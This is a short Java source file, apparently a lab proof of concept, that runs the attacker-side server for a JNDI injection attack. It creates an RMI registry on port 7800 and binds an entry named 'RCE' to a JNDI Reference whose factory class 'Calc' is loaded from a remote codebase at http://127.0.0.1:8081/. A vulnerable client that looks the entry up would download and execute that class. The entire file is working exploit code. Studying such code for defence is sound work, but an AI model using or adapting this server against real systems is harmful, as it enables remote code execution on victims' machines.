package com.sec.cwm.base.jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMI_JNDI_Inject_Server {
    public static void main(String[] args) throws Exception{
        Registry regs= LocateRegistry.createRegistry(7800);
        Reference ref=new Reference("Calc","Calc","http://127.0.0.1:8081/");
        ReferenceWrapper wrapper=new ReferenceWrapper(ref);
        regs.bind("RCE",wrapper);
    }
}
